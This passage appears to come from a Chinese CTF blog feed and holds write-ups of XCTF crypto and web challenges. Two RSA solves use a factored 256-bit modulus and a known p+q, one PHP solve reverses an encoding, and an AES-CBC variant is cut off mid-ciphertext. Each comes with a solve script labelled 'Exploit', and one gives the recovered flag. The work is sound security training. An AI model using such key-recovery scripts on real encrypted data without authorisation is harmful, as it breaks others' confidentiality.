class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pq=&quot;</span>,pq)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;qp=&quot;</span>,qp)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c= 8722269075970644434253339592758512788160408912707387632591552130175707843950684315083250494010055435391879036285103810263591951437829414438640307561645721347859659807138051841516634704123100270651976676182059252251162982609391666023674158274992400910869692389001622774140191223807887675081808561012755545464977015973615407965906513878979919700065923364884766974187303774330319143647840846354404070430118235352622445115153298578370521811697710289716188726587743282814946239856766713516166990341116198180068191759095913957606379780234116317390622824096667107736103270907349927467971817639795094030622157581511033950777</span></span><br><span class="line"><span class="string">n= 10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074584935050067254029262890188260006596141011807724688556673520261743199388391094490191001701011230322653422314758778116196105077883955436582364267530633358016652912054880813710531145973799193443828969535902856467548523653920307742364119002349899553478815101092655897400295925170383678499125295006364960124859003</span></span><br><span class="line"><span class="string">pq= 10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074488896197029704465200125337817646702009123916866455067019234171839614862660036737875747177391796376553159880972782837853473250804807544086701088829096838316550146794766718580877976153967582795248676367265069623900208276878140709691073369415161936376086988069213820933152601453587292943483693378833664901178324</span></span><br><span class="line"><span class="string">qp= 10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074475956379708898904933143429835002718457573266164923043251954374464149976302585916538814746811455883837138715445492053610047383292461097590195481556557381952895539341802954749542143253491617052100969586396996063822508764438280468492894012685918249843558593322831683872737943676955669923498182824352081785243246</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>既然题目已经提醒了是<code>RSA</code>的相关内容那就直接开搞即可</p><p>关键点：各个参数的值(即公钥 密钥)、欧拉定理：通用$phi&#x3D;(p−1)(q−1)$</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit:"></a>Exploit:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">c= <span class="number">8722269075970644434253339592758512788160408912707387632591552130175707843950684315083250494010055435391879036285103810263591951437829414438640307561645721347859659807138051841516634704123100270651976676182059252251162982609391666023674158274992400910869692389001622774140191223807887675081808561012755545464977015973615407965906513878979919700065923364884766974187303774330319143647840846354404070430118235352622445115153298578370521811697710289716188726587743282814946239856766713516166990341116198180068191759095913957606379780234116317390622824096667107736103270907349927467971817639795094030622157581511033950777</span></span><br><span class="line">n= <span class="number">10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074584935050067254029262890188260006596141011807724688556673520261743199388391094490191001701011230322653422314758778116196105077883955436582364267530633358016652912054880813710531145973799193443828969535902856467548523653920307742364119002349899553478815101092655897400295925170383678499125295006364960124859003</span></span><br><span class="line">pq= <span class="number">10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074488896197029704465200125337817646702009123916866455067019234171839614862660036737875747177391796376553159880972782837853473250804807544086701088829096838316550146794766718580877976153967582795248676367265069623900208276878140709691073369415161936376086988069213820933152601453587292943483693378833664901178324</span></span><br><span class="line">qp= <span class="number">10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074475956379708898904933143429835002718457573266164923043251954374464149976302585916538814746811455883837138715445492053610047383292461097590195481556557381952895539341802954749542143253491617052100969586396996063822508764438280468492894012685918249843558593322831683872737943676955669923498182824352081785243246</span></span><br><span class="line"></span><br><span class="line">phi = pq * qp // n</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Crypto-二元一次方程组</title>
      <link href="/2025/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-%E4%BA%8C%E5%85%83%E4%B8%80%E6%AC%A1%E6%96%B9%E7%A8%8B%E7%BB%84/"/>
      <url>/2025/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-%E4%BA%8C%E5%85%83%E4%B8%80%E6%AC%A1%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size = <span class="number">256</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = number.getPrime(size)</span><br><span class="line">q = number.getPrime(size)</span><br><span class="line">avg = (p+q)/<span class="number">2</span></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;avg = %d&#x27;</span> % avg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %d&#x27;</span> % c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看上述代码感觉老朋友了，详情可以看上一篇的<code>baigeiRSA</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">size = <span class="number">256</span></span><br><span class="line">e = <span class="number">65537</span></span><br></pre></td></tr></table></figure><p><code>size=256</code>定义了生成的素数<code>p</code>和<code>q</code>的比特长度</p><p><code>e=65537</code>是RSA公钥指数，是一个固定的值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = number.getPrime(size)</span><br><span class="line">q = number.getPrime(size)</span><br><span class="line">avg = (p+q)/<span class="number">2</span></span><br><span class="line">n = p*q</span><br></pre></td></tr></table></figure><p>生成 RSA密钥</p><p>其中设计两个公式：</p><p>$$avg &#x3D; \frac{p+q} {2}$$</p><p>$$n&#x3D;p*q$$</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">m</span> = libnum.s2n(flag)</span><br><span class="line"><span class="attr">c</span> = pow(m, e, n)</span><br></pre></td></tr></table></figure><p><code>libnum.s2n(flag)</code>：将<code>flag</code>字符串转换为一个大整数<code>m</code>（<code>s2n</code>表示“string to number”）。</p><p><code>c = pow(m, e, n)</code>：计算密文<code>c</code>，即<code>m^e mod n</code>（RSA加密的核心操作）。</p><p>之后两个<code>print</code>即输出结果</p><p>我们回到上面的两个公式，再结合题目名称，将第一个公式的分母移至左边，加上公式2可以得到</p><p>$$p + q &#x3D; 2avg$$</p><p>$$p * q &#x3D; n$$</p><p>于是这题可以使用韦达定理来解体</p><h2 id="Exploit："><a href="#Exploit：" class="headerlink" title="Exploit："></a>Exploit：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">5700102857084805454304483466349768960970728516788155745115335016563400814300152521175777999545445613444815936222559357974566843756936687078467221979584601</span></span><br><span class="line">avg = <span class="number">75635892913589759545076958131039534718834447688923830032758709253942408722875</span></span><br><span class="line">c = <span class="number">888629627089650993173073530112503758717074884215641346688043288414489462472394318700014742820213053802180975816089493243275025049174955385229062207064503</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi_n = n - <span class="number">2</span> * avg + <span class="number">1</span>  <span class="comment"># phi(n) = (p-1)(q-1) = pq-(p+q)+1</span></span><br><span class="line">d = modinv(e, phi_n)  <span class="comment"># de = 1 mod phi_n, d = e^-1 mod phi_n</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Crypto-baigeiRSA</title>
      <link href="/2025/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-baigeiRSA/"/>
      <url>/2025/07/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-baigeiRSA/</url>
      
        <content type="html"><![CDATA[<h2 id="拿到附件后查看内容"><a href="#拿到附件后查看内容" class="headerlink" title="拿到附件后查看内容"></a>拿到附件后查看内容</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">size = <span class="number">128</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = number.getPrime(size)</span><br><span class="line">q = number.getPrime(size)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %d&#x27;</span> % c)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="参数设置"><a href="#参数设置" class="headerlink" title="参数设置"></a>参数设置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">size = <span class="number">128</span></span><br><span class="line">e = <span class="number">65537</span></span><br></pre></td></tr></table></figure><p><code>size</code>处设置了生成的素数<code>p</code>和<code>q</code>的比特长度</p><p><code>e=65537</code>：RSA的公钥指数，这是一个常用的固定值</p><h3 id="生成RSA密钥"><a href="#生成RSA密钥" class="headerlink" title="生成RSA密钥"></a>生成RSA密钥</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = number.getPrime(size)</span><br><span class="line">q = number.getPrime(size)</span><br><span class="line">n = p*q</span><br></pre></td></tr></table></figure><p><code>number.getPrime(size)</code>生成一个<code>size</code>比特的随机素数</p><p><code>n = p*q</code>：计算RSA的模数<code>n</code>（一个256位的数）。</p><h3 id="加密flag"><a href="#加密flag" class="headerlink" title="加密flag"></a>加密flag</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = libnum.s2n(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br></pre></td></tr></table></figure><p><code>libnum.s2n(flag)</code>：将<code>flag</code>字符串转换为一个大整数<code>m</code>（<code>s2n</code>表示“string to number”）。</p><p><code>c = pow(m, e, n)</code>：计算密文<code>c</code>，即<code>m^e mod n</code>（RSA加密的核心操作）。</p><h3 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n = %d&#x27;</span> % n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c = %d&#x27;</span> % c)</span><br></pre></td></tr></table></figure><h2 id="解密思路"><a href="#解密思路" class="headerlink" title="解密思路"></a>解密思路</h2><ol><li>分解<code>n</code>得到<code>p</code>和<code>q</code>（因为<code>n</code>是256位的，对于现代计算机来说分解是可行的）。</li><li>计算欧拉函数<code>φ(n) = (p-1)*(q-1)</code>。</li><li>计算私钥<code>d</code>，即<code>e</code>模<code>φ(n)</code>的逆元：<code>d = pow(e, -1, φ(n))</code>。</li><li>解密密文：<code>m = pow(c, d, n)</code>。</li><li>将<code>m</code>转换为字符串：<code>flag = libnum.n2s(m)</code>。</li></ol><p>于是我们构造以下exploit</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">size = <span class="number">128</span></span><br><span class="line">n = <span class="number">88503001447845031603457048661635807319447136634748350130947825183012205093541</span></span><br><span class="line">c = <span class="number">40876621398366534035989065383910105526025410999058860023908252093679681817257</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分解n得到的p和q</span></span><br><span class="line">p=unknown</span><br><span class="line">q=unknown</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = libnum.n2s(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure><p>然后暴力分解因数<code>n</code>得到<code>p</code>和<code>q</code></p><p><img src="/images/baigeiRSA-1.png" alt="图一展示了在&#96;http:&#x2F;&#x2F;www.factordb.com&#x2F;&#96;上暴力分解因数"></p><p>则最终的exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"></span><br><span class="line">size = <span class="number">128</span></span><br><span class="line">n = <span class="number">88503001447845031603457048661635807319447136634748350130947825183012205093541</span></span><br><span class="line">c = <span class="number">40876621398366534035989065383910105526025410999058860023908252093679681817257</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p=<span class="number">274539690398523616505159415195049044439</span></span><br><span class="line">q=<span class="number">322368694010594584041053487661458382819</span></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = libnum.n2s(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure><p>成功Caught the flag!</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">workspace<span class="comment"># python3 exploit.py </span></span><br><span class="line">解密后的flag: b&#x27;HSCTF&#123;<span class="meta">@Zh3n_Ba1_G3i!</span><span class="meta">@&#125;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web康复训练-攻防世界Web2</title>
      <link href="/2025/07/12/Web%E5%BA%B7%E5%A4%8D%E8%AE%AD%E7%BB%83-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb2/"/>
      <url>/2025/07/12/Web%E5%BA%B7%E5%A4%8D%E8%AE%AD%E7%BB%83-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb2/</url>
      
        <content type="html"><![CDATA[<p>打开题目，给了以下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);</span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><ul><li><p><code>strlen()</code> 函数返回字符串的长度</p></li><li><p><code>strrev()</code>  反转字符串顺序</p></li></ul><p><em>This is an example:</em></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strrev</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出反转字符串 “!dlroW olleH”：</p><ul><li><p><code>substr()</code> 函数返回字符串的一部分。<code>substr(string,start,length)</code></p><p>tips：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</p></li><li><p><code>&lt;?php echo substr(&quot;Hello world&quot;,6); ?&gt;</code>从字符串中返回 “world”：</p></li><li><p><code>ord()</code> 函数返回字符串中第一个字符的 ASCII 值。</p></li><li><p><code>chr()</code> 函数从指定 ASCII 值返回字符。并可以指定ASCII是十进制或是十六进制或是八进制。</p></li><li><p>“.” 是字符运算符，作用是把两个字符串连接起来，其使用方法：首先创建一个PHP示例文件；然后定义两个变量；最后通过“$result.$result”方式将两个变量连接起来即可</p></li><li><p><code>str_rot13()</code> 函数对字符串执行 ROT13 编码。</p><p>ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。</p></li></ul><p>综上，题目提示我们逆向加密算法，也就是说第一步加密变为最后一步，以此类推，那可以构造出逆向后的代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$miwen</span>)));</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$a</span>,<span class="variable">$i</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$d</span>); </span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$b</span>.<span class="variable">$_c</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span>= <span class="title function_ invoke__">strrev</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$p</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="/images/web2-flag.PNG" alt="Successfully caught the flag!"></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Crypto-了不起的盖茨比</title>
      <link href="/2025/07/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84%E7%9B%96%E8%8C%A8%E6%AF%94/"/>
      <url>/2025/07/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCrypto-%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84%E7%9B%96%E8%8C%A8%E6%AF%94/</url>
      
        <content type="html"><![CDATA[<h3 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h3><p>小王读了盖茨比深受震撼，于是摘录本书并效仿原作者为你加密留了一段言，但他忘记给你iv了，请问你可以恢复出来原文吗<br>(得到的flag内容用CatCTF{}包上提交)</p><p>附件内容为python源代码程序，对其进行分析：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor <span class="keyword">as</span> xor  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> copy  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> data  </span><br><span class="line">  </span><br><span class="line">iv=<span class="built_in">bytes</span>([randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">8</span>-<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])   </span><br><span class="line">iva=copy(iv)  </span><br><span class="line">key=<span class="built_in">bytes</span>([randint(<span class="number">0</span>,<span class="number">2</span>**<span class="number">8</span>-<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)])  </span><br><span class="line">cipher=AES.new(key,mode=AES.MODE_ECB)  </span><br><span class="line">data=pad(data,<span class="number">16</span>)  </span><br><span class="line">c=<span class="string">b&quot;&quot;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),<span class="number">16</span>):  </span><br><span class="line">    s=data[i:i+<span class="number">16</span>].ljust(<span class="number">16</span>,<span class="string">b&quot;\n&quot;</span>)  </span><br><span class="line">    c+=cipher.encrypt(xor(s,iv))  </span><br><span class="line">    iv=xor(s,c[-<span class="number">16</span>:])  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">key=b64encode(key)  </span><br><span class="line">c=b64encode(c)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(key)  </span><br><span class="line"><span class="built_in">print</span>(c)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">b&#x27;+0zkhmid1PFjVdxSP09zSw==&#x27;  </span></span><br><span class="line"><span class="string">b&#x27;A0bzFxdM95YoXm64g0gZkiTloPsBAq7iV56t1M7Q4zVNxRJSTdZH0lzOMa7QyIQbKN/ftm01iZgQAk+JVgCB6hlCdMPWkdpKYHix8BTq/ClEHUPwMEjUEvgKD4tH3T/thoccBw1jfJ9RjhXbMFByWn5cyA/gHVvEEJRpII/ryKMQkzelioQ5b0MfhSy4INLqQk6yAgLzihip5ho7lDJCbYcaz85bDksOo5n9kjOfjFnjUn9G7jX+AtyhygPlGfrvauTeuPdVxqrJTVHvrzUNAqiqtCElX+BWpicP2mkZLt5B/gpquTv8U+StrdTOcr7UkWuz+YdhXkTJYUZguv7EbEnRy+M64QzqfnNf8Zk0tJQ5xOumbY8hxGTuZ8w3rWxjPKLhdgTGLgMcMYF3hPb2eqG9VZKC3T9zElI5MWPyIdkmqkrLEt6vGT8AxWJy1hl2ApkGhrJFB0DobJircN6kXUXvZXitjXSH+BA48muaRlAwK13re+zIcbI+B7+Tm3LuRT9j5NWD9RBoy+IeAQvR05IKWqEpqXEScmZsQxpAFZCSnbchYaYNAuHvBwMcMW7vTMyxROHRtyZ+gWNUhpd8CcZ9FA6w+cwQLMWW5D4nUCMK+NEsSyTBBm/jTiAp/waq+2dTVyBhbQtmm9pBtZtHJtfeVRKuZRXduNnlWDa7Wlwv0Jk2EIJpAaXxosuZnO0PHW3oX+WO5F9ydIfIJAFUpBrn4fMx3c7IJ08+bKwAfBw/johSs1ieyX/YjOOL1KbE9J6Hz3ZBBR4waQ4p9sdLsJ9UFnNghH0ZuB2F7bGoH7SurvaMglo3FyQAfM+n/EVCGWnax/JGEcw5YZuS2c7y5Gd4oOCmpFO/lVj0IaOlZsFsMgQ3GUsBT2h1yh4yarlYUczvGNyOyfUXfueCDBQJNJ7adbdra/DHpV3LXieADKED2HankT+9ACs8oVYPpZhji0UuCdvs1txytsCqPSf5l7JLDkrGP3/7Ob7UcCA4h/B+6/0xg7h+ZJ6ZR41sDpOR8S4pmPlfJkU/np52QZfplY0sKpKlaYhuhUmMSle2TAcvNUGHobNTReFV/MOfX5/HX6behFAeOwHGI14AvUbDmrmkVvbyU88DzBW2YQ/tTTiSLg/wgggkkhLd17NZAMB3XbKuw3WdkdyJfTTpyiN05DqMwV3q64fpzasFXFNQ7ix8Q/APov/TmBYtgFw4ys2jKC6Yws166RXRkrQXzY4Ey9Xvjp5i5nUgW2HLHRGz2B5lg0jI9oWjj5+89Y0Tcqb81OFD5SfeqTbg7Y2WoW6YjQ/Hzvt1l0+p/lFrnOy3ORfhwl+DFBZi4P9i+Hh7/uC1kCW8Lil2M9oVaAH4YB2yhm61AqEk4NPhSeTuioaFfvUY5lD75QiM6BdDFMTlNkC7crXmuiUpztHTzIS6E1kVARI8xsGeljjmJmuKIfQPPQfvSnnAjGeaxCNmRPDMgFGltFiGy63Pv/tVRWbUWiB27APHPsqM2qcV/nM8IwDx5xmwExl/atQXGzn/LL4xyqzmyzD+2qMeZqfzcKZWOjoWIX+SycPvc62HAQmsKqZK5ZO2JKq5OeuFEovG9oOcRYve1XStbTQYiocEbQ4XX/c6xE0cm9P/I5NM1Mlr6CT6qt3Pqb/m+7s/kwzww59FKOq5R6HmK7SHCQ6gwTQ1ciGWbJF3NLHuOpe08X4xl/l0tJengSfJRJ39Q9WwZbgBlEPf7NYeMlR9zU9QQxvZ+r4LiaJVYrQYSCcDj37Vk9XVRMijBDWDWFbK5sgkDHQYmwGYiwH4hEAqA